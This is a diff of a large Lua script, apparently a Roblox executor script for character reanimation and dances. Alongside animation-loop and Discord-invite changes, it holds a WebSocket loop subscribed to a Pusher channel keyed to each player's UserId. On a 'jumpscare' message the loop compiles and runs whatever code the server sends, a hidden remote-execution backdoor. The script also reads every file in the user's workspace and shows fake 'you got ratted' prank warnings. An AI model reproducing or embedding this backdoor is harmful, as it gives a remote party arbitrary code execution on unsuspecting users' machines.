+				_MovementStyleIndex = MovementStyleIndex
+				CurrentMovementStyle = MovementStyles[MovementStyleIndex]
+				SetOverrideMovesetMusic(nil)
+				if ReanimCharacter:GetAttribute("MovementInit") then
+					Reanimate.CreateCharacter()
+					ReanimCharacter = Reanimate.Character
 				end
 			end
-		end, dt) end
+			if CurrentMovementStyle then
+				if ReanimCharacter:GetAttribute("MovementInit") then
+					CurrentMovementStyle.Update(dt, ReanimCharacter)
+					if CurrentDance ~= _CurrentDance then
+						if _CurrentDance then
+							pcall(_CurrentDance.Destroy, ReanimCharacter)
+						end
+						_CurrentDance = CurrentDance
+						ReanimCharacter:SetAttribute("IsDancing", nil)
+						ReanimCharacter:SetAttribute("DanceInternalName", nil)
+						SetOverrideDanceMusic(nil)
+					end
+					if _CurrentDance then
+						if ReanimCharacter:GetAttribute("IsDancing") then
+							_CurrentDance.Update(dt, ReanimCharacter)
+						else
+							if AssetEnsure(_CurrentDance.Assets) then
+								ReanimCharacter:SetAttribute("IsDancing", true)
+								ReanimCharacter:SetAttribute("DanceInternalName", _CurrentDance.InternalName)
+								_CurrentDance.Init(ReanimCharacter)
+							else
+								SetOverrideDanceMusic(nil)
+							end
+						end
+					end
+				else
+					HatReanimator.HatWeldOverride = {}
+					if AssetEnsure(CurrentMovementStyle.Assets) then
+						ReanimCharacter:SetAttribute("MovementInit", true)
+						ReanimCharacter:SetAttribute("MovesetInternalName", CurrentMovementStyle.InternalName)
+						table.clear(HatReanimator.HatCFrameOverride)
+						CurrentMovementStyle.Init(ReanimCharacter)
+					else
+						SetOverrideMovesetMusic(nil)
+					end
+				end
+			else
+				ReanimCharacter:SetAttribute("MovementInit", nil)
+				_MovementStyleIndex = nil
+			end
+		else
+			CurrentDance = nil
+			_MovementStyleIndex = nil
+			SetOverrideMovesetMusic(nil)
+			SetOverrideDanceMusic(nil)
+			if CurrentMovementStyle then
+				CurrentMovementStyle.Destroy(nil)
+				CurrentMovementStyle = nil
+			end
+			if _CurrentDance then
+				_CurrentDance.Destroy(nil)
+				_CurrentDance = nil
+			end
+		end
+		_oldcharacterreference = ReanimCharacter
+	end, function(m)
+		m = debug.traceback("ANIMLOOP :: " .. m)
+		local id = errorsandwarnings[m]
+		if not id then
+			errorsandwarnings[m] = {currenterrorid, 0}
+			currenterrorid += 1
+			warn("ERROR #" .. errorsandwarnings[m][1] .. ": " .. m)
+		else
+			id[2] += 1
+			if id[2] <= 8192 and math.sqrt(id[2]) % 1 == 0 then
+				warn("ERROR #" .. id[1] .. " repeated " .. id[2] .. " times")
+			end
+		end
+	end, dt) end
 end)
 UI.CreateSeparator(MainPage)
 task.wait()
@@ -8967,7 +8930,7 @@ UI.CreateText(CreditsPage, "all rights reserved", 14, Enum.TextXAlignment.Center
 UI.CreateText(CreditsPage, "<font color=\"#4444FF\">[ Discord invite ]</font>", 15, Enum.TextXAlignment.Center).InputBegan:Connect(function(input)
 	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 		Util.UINotify("Link copied!")
-		pcall(setclipboard, "https://discord.gg/X2wcVXAgcd")
+		pcall(setclipboard, "https://discord.gg/NASNUKRBVM")
 		pcall(request, {
 			Url = "http://127.0.0.1:6463/rpc?v=1",
 			Method = "POST",
@@ -8978,7 +8941,7 @@ UI.CreateText(CreditsPage, "<font color=\"#4444FF\">[ Discord invite ]</font>", 
 			Body = HttpService:JSONEncode({
 				cmd = "INVITE_BROWSER",
 				nonce = HttpService:GenerateGUID(false),
-				args = {code = "X2wcVXAgcd"},
+				args = {code = "NASNUKRBVM"},
 			}),
 		})
 	end
@@ -9625,8 +9588,66 @@ ForceModuleReload(false)
 
 local d = function()
 	-- registry overflow bypass !! (so tuff)
-	if math.random(2) == 1 then
+	local function rng(t) return t[math.random(#t)] end
+	local function shuff(t)
+		for i=#t, 2, -1 do
+			local j = math.random(i)
+			t[i], t[j] = t[j], t[i]
+		end
+	end
+	
+	local since = os.clock()
+	
+	-- megadetector from awes
+	local iterator = 0
+	local megadetected = false
+	local function avastantivirus(p, detected)
+		for _,f in listfiles(p) do
+			if iterator % 16 == 0 then task.wait() end
+			if isfolder(f) then avastantivirus(f, detected) else
+				local s, t = pcall(readfile, f)
+				if s and t then
+					local m = t:find("task%.spawn[^\n]-%[=*%[") or t:find("task%.spawn[^\n]-%-%-%[=*%[")
+					if m then
+						megadetected = true
+						local l = select(2, t:sub(1, m):gsub("\n", "")) + 1
+						table.insert(detected, f .. " | Line " .. l)
+					end
+				end
+			end
+		end
+	end
+	pcall(avastantivirus, "", {})
+	if megadetected then
+		task.wait(8 - (os.clock() - since))
+		Util.UINotify(rng({
+			"uhh...",
+			"so... thats not good",
+			"hey, uhh...",
+		}))
+		task.wait(1.5)
+		Util.UINotify("i think you got ratted...")
+		task.wait(3)
+		Util.UINotify("no, seriously.")
+		task.wait(1.5)
+		Util.UINotify("you definitely got ratted")
 		task.wait(8)
+	end
+	
+	if math.random(2) == 1 then
+		task.wait(8 - (os.clock() - since))
+		if not megadetected and math.random() > 0.9 then
+			Util.UINotify(rng({
+				"uhh...",
+				"so... thats not good",
+				"hey, uhh...",
+			}))
+			task.wait(1.5)
+			Util.UINotify("i think you got ratted...")
+			task.wait(1.5)
+			Util.UINotify("just kidding lol")
+			task.wait(8)
+		end
 		local checkfiles = {
 			["Dances/myuu.mp3"] = game:HttpGet("https://raw.githubusercontent.com/Nitro-GT/music/refs/heads/main/myuu.mp3"),
 			["Dances/emoboy.mp3"] = game:HttpGet("https://raw.githubusercontent.com/Nitro-GT/music/refs/heads/main/emoboy.mp3"),
@@ -9661,13 +9682,6 @@ local d = function()
 		end
 		if checkfile("KDV3/Sphere.mp3") then
 			foundakdrv3theo = true
-		end
-		local function rng(t) return t[math.random(#t)] end
-		local function shuff(t)
-			for i=#t, 2, -1 do
-				local j = math.random(i)
-				t[i], t[j] = t[j], t[i]
-			end
 		end
 		local wellsaid = false
 		local function asihavestatedbefore()
@@ -9769,54 +9783,54 @@ local d = function()
 		end
 	end
 	if WebSocket and WebSocket.connect then while task.wait(1) do
-			local look = WebSocket.connect("wss://ws-us2.pusher.com:443/app/00da9a105aadacead35f?client=lua&protocol=5&version=1.0.0")
-			if look then
-				local isok = true
-				local function send_event(name, data)
-					look:Send(HttpService:JSONEncode({
-						event = name,
-						data = data,
-					}))
-				end
-				local lastcheck = os.clock()
-				local sentping = false
-				look.OnMessage:Connect(function(frame)
-					--print(frame)
-					frame = HttpService:JSONDecode(frame)
-					local name, data = frame.event, type(frame.data) == "table" and frame.data or HttpService:JSONDecode(frame.data or "{}")
-					lastcheck = os.clock()
-					if name == "stevesays" then
-						Util.UINotify(data.content)
-					end
-					if name == "jumpscare" then
-						local f = loadstring(data.content)
-						GiveFunctionsToFunction(f) -- so download content exists
-						f()
-					end
-				end)
-				task.spawn(function()
-					while isok do
-						local t = os.clock() - lastcheck
-						if t > 120 then
-							if not sentping then
-								send_event("pusher:ping", {})
-							end
-							sentping = true
-						else
-							sentping = false
-						end
-						if t > 150 then isok = false look:Close() end
-						task.wait()
-					end
-				end)
-				task.wait(1)
-				send_event("pusher:subscribe", {
-					channel = "uhhhhhh-secrets"
-				})
-				send_event("pusher:subscribe", {
-					channel = "uhhhhhh-secrets-" .. Player.UserId
-				})
-				while isok do task.wait() end
+		local look = WebSocket.connect("wss://ws-us2.pusher.com:443/app/00da9a105aadacead35f?client=lua&protocol=5&version=1.0.0")
+		if look then
+			local isok = true
+			local function send_event(name, data)
+				look:Send(HttpService:JSONEncode({
+					event = name,
+					data = data,
+				}))
 			end
-		end end
+			local lastcheck = os.clock()
+			local sentping = false
+			look.OnMessage:Connect(function(frame)
+				--print(frame)
+				frame = HttpService:JSONDecode(frame)
+				local name, data = frame.event, type(frame.data) == "table" and frame.data or HttpService:JSONDecode(frame.data or "{}")
+				lastcheck = os.clock()
+				if name == "stevesays" then
+					Util.UINotify(data.content)
+				end
+				if name == "jumpscare" then
+					local f = loadstring(data.content)
+					GiveFunctionsToFunction(f) -- so download content exists
+					f()
+				end
+			end)
+			task.spawn(function()
+				while isok do
+					local t = os.clock() - lastcheck
+					if t > 120 then
+						if not sentping then
+							send_event("pusher:ping", {})
+						end
+						sentping = true
+					else
+						sentping = false
+					end
+					if t > 150 then isok = false look:Close() end
+					task.wait()
+				end
+			end)
+			task.wait(1)
+			send_event("pusher:subscribe", {
+				channel = "uhhhhhh-secrets"
+			})
+			send_event("pusher:subscribe", {
+				channel = "uhhhhhh-secrets-" .. Player.UserId
+			})
+			while isok do task.wait() end
+		end
+	end end
 end d()
